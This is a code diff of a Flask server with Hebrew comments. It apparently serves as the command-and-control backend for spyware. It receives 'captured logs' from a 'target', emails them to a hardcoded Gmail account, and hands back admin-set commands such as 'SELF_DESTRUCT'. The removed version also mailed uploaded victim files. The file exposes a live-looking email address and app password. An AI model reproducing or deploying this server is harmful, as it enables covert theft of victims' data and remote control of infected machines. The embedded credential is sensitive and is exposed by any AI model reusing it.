@@ -1,118 +1,94 @@
 import os
 import smtplib
-from flask import Flask, request, jsonify
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
+import sys
+from flask import Flask, request
+from email.message import EmailMessage
 
 app = Flask(__name__)
 
+# --- הגדרות ---
+# וודא שהמייל והסיסמה (16 תווים בלי רווחים) נכונים
 EMAIL_USER = "n77971507@gmail.com"
 EMAIL_PASS = "kcfyrlwmuqqwvgil"
 
-# משתנה לשמירת הפקודה הנוכחית בזיכרון
+# משתנה פקודה (כאן נשמר הסטטוס למחיקה)
 current_cmd = "OK"
 
 
-def send_to_mail(subject, body, file_path=None):
-    """פונקציה לשליחת מייל עם לוגים מפורטים"""
-    print(f"[*] Starting email sequence to: {EMAIL_USER}")
-
-    msg = MIMEMultipart()
+def send_to_mail(subject, content, attachment_path=None):
+    """שליחת מייל מיידית - מותאם ל-Render (Port 465)"""
+    msg = EmailMessage()
+    msg.set_content(content)
+    msg['Subject'] = subject
     msg['From'] = EMAIL_USER
     msg['To'] = EMAIL_USER
-    msg['Subject'] = subject
-    msg.attach(MIMEText(body, 'plain'))
 
-    if file_path:
+    # טיפול בקובץ מצורף (לפקודת מחיקה/קבצים)
+    if attachment_path and os.path.exists(attachment_path):
         try:
-            with open(file_path, "rb") as f:
-                part = MIMEBase("application", "octet-stream")
-                part.set_payload(f.read())
-                encoders.encode_base64(part)
-                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
-                msg.attach(part)
-            print(f"[*] Attached file: {file_path}")
+            with open(attachment_path, 'rb') as f:
+                file_data = f.read()
+                file_name = os.path.basename(attachment_path)
+                msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
         except Exception as e:
-            print(f"[!] Attachment error: {e}")
+            print(f"DEBUG: Attachment Error: {e}", file=sys.stderr)
 
     try:
-        print("[*] Connecting to Google SMTP server...")
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()  # הצפנה
-
-        print("[*] Attempting login...")
-        server.login(EMAIL_USER, EMAIL_PASS)
-
-        print("[*] Sending message...")
-        server.sendmail(EMAIL_USER, EMAIL_USER, msg.as_string())
-
-        server.quit()
-        print("[SUCCESS] Email was sent successfully!")
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+            smtp.login(EMAIL_USER, EMAIL_PASS)
+            smtp.send_message(msg)
+        print(f"DEBUG: [SUCCESS] Mail sent: {subject}", file=sys.stderr)
         return True
-    except smtplib.SMTPAuthenticationError:
-        print("[ERROR] Authentication failed! Check your App Password or Email.")
     except Exception as e:
-        print(f"[ERROR] Something went wrong: {e}")
-    return False
+        print(f"DEBUG: [ERROR] Mail failed: {e}", file=sys.stderr)
+        return False
 
 
 # --- נתיבי השרת ---
 
-@app.route('/api/client', methods=['POST'])
+@app.route('/api/v2/client', methods=['POST'])
 def client_entry():
+    """נתיב קבלת מידע מהמטרה"""
     global current_cmd
 
-    # וידוא קבלת נתונים
-    incoming_data = request.get_json()
-    if not incoming_data:
-        print("[!] Received empty POST request")
-        return current_cmd, 200
+    json_data = request.get_json(silent=True)
+    if not json_data:
+        return current_cmd, 200  # מחזיר את הפקודה הנוכחית גם אם אין דאטה
 
-    data = incoming_data.get("data", "")
-    print(f"[*] Received data from client: {data[:50]}...")  # מדפיס רק את ההתחלה של הלוג
+    log_content = json_data.get("data", "")
 
-    if data:
-        # שליחה למייל
-        send_to_mail("New Logs Captured", f"Content recorded:\n\n{data}")
+    if log_content:
+        # שליחה מיידית למייל ברגע שהמידע מגיע
+        print(f"DEBUG: Data received, sending mail...", file=sys.stderr)
+        send_to_mail("Captured Logs - Target", log_content)
 
-    # מחזיר ללקוח את הפקודה שמחכה לו
+    # מחזיר למטרה את הפקודה (למשל "OK" או "SELF_DESTRUCT")
     return current_cmd, 200
 
 
-@app.route('/upload', methods=['POST'])
-def file_upload():
-    if 'file' not in request.files:
-        print("[!] Client tried to upload without a file")
-        return "No file", 400
-
-    f = request.files['file']
-    path = os.path.join("/tmp", f.filename)
-    f.save(path)
-    print(f"[*] File saved temporarily: {path}")
-
-    success = send_to_mail(f"File Received: {f.filename}", "Attached PDF file.", path)
-
-    if os.path.exists(path):
-        os.remove(path)
-        print(f"[*] Temporary file removed: {path}")
-
-    return "OK" if success else "Error", 200
-
-
-@app.route('/api/admin/command', methods=['POST'])
-def update_command():
+@app.route('/api/admin/set_command', methods=['POST'])
+def set_command():
+    """נתיב עבור ה-UI שלך - לשלוח פקודת מחיקה"""
     global current_cmd
-    new_cmd = request.json.get("command")
-    if new_cmd:
-        current_cmd = new_cmd
-        print(f"[ADMIN] Command updated to: {current_cmd}")
-    return "Updated", 200
+    json_data = request.get_json(silent=True)
+
+    if json_data and "command" in json_data:
+        current_cmd = json_data.get("command")  # למשל: "SELF_DESTRUCT"
+        print(f"DEBUG: Admin updated command to: {current_cmd}", file=sys.stderr)
+        return f"Command updated to {current_cmd}", 200
+    return "Invalid Data", 400
+
+
+@app.route('/')
+def health_check():
+    return "Server is Live", 200
 
 
 if __name__ == '__main__':
-    # Render משתמש בפורט שמוגדר במשתני הסביבה
-    port = int(os.environ.get("PORT", 5000))
-    print(f"[*] Server starting on port {port}...")
+    # ב-Render חינמי הפורט הוא בדרך כלל 10000
+    port = int(os.environ.get("PORT", 10000))
+
+    # בדיקת חיבור מיידית בעלייה
+    send_to_mail("Server Restarted", "V2 Server is now running on Render.")
+
     app.run(host='0.0.0.0', port=port)
